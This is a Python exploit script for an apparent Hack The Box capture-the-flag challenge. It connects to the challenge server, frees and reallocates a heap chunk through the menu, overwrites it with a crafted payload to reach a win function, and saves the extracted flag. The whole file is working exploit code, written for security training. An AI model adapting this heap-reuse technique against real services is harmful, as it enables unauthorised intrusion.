import socket
import re
import time

# Remote connection details
HOST = '209.38.194.191'
PORT = 30705

def recv_until(s, delim):
    buffer = b""
    while delim not in buffer:
        try:
            chunk = s.recv(1)
            if not chunk:
                raise EOFError("Connection closed prematurely.")
            buffer += chunk
        except socket.timeout:
            raise TimeoutError("Socket timeout while waiting for delimiter.")
    return buffer

def exploit():
    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10) # Increase general timeout
    s.connect((HOST, PORT))

    # Receive initial banner until the prompt
    print("[*] Receiving initial banner and menu...")
    try:
        buffer = recv_until(s, b'> ')
        print(f"[+] Received menu prompt: {buffer.decode(errors='ignore').strip()}")
    except TimeoutError as e:
        print(f"[-] Timeout while waiting for menu prompt: {e}")
        print(f"[-] Current buffer: {buffer.decode(errors='ignore')}")
        return

    # 2. Free chunk_A (allocated_space)
    print("[*] Sending option 2 (Obliterate) to free allocated_space...")
    s.sendall(b'2\n')
    recv_until(s, b'> ')
    print("[+] allocated_space freed.")

    # 3. Re-allocate chunk_A (as chunk_B) and overflow
    print("[*] Sending option 1 (Reserve space) to re-allocate chunk...")
    s.sendall(b'1\n')
    recv_until(s, "📦 𝐒𝐩𝐚𝐜𝐞 𝐭𝐨 𝐫𝐞𝐬𝐞𝐫𝐯𝐞: ".encode('utf-8'))
    print("[+] Prompt for size received.")

    size = 38 # 0x26 bytes, same as original allocated_space
    print(f"[*] Sending size: {size}")
    s.sendall(str(size).encode() + b'\n')
    recv_until(s, "🛰️ 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐨𝐫 𝐍𝐄𝐌𝐄𝐆𝐇𝐀𝐒𝐓: ".encode('utf-8'))
    print("[+] Prompt for content received.")

    # Payload: 30 bytes of junk + "w3th4nds"
    # 0x1e bytes = 30 bytes
    payload = b'A' * 30 + b'w3th4nds'
    print(f"[*] Sending payload: {payload}")
    s.sendall(payload + b'\n')
    recv_until(s, b'> ')
    print("[+] Payload sent and chunk overwritten.")

    # 4. Trigger road_to_salvation
    print("[*] Sending option 3 (Escape) to trigger road_to_salvation...")
    s.sendall(b'3\n')

    # Receive all remaining data and extract flag
    print("[*] Receiving all output...")
    full_output = b""
    s.settimeout(2) # Short timeout for final receive
    while True:
        try:
            data = s.recv(4096)
            if not data:
                break
            full_output += data
        except socket.timeout:
            break
    s.close()

    print(f"[+] Full output received:\n{full_output.decode(errors='ignore')}")

    flag_match = re.search(r'HTB{[^}]+}', full_output.decode(errors='ignore'))
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] Flag found: {flag}")
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("[+] Flag saved to flag.txt")
    else:
        print("[-] Flag not found in the output.")

if __name__ == "__main__":
    try:
        exploit()
    except (EOFError, TimeoutError) as e:
        print(f"[-] Error during exploit: {e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
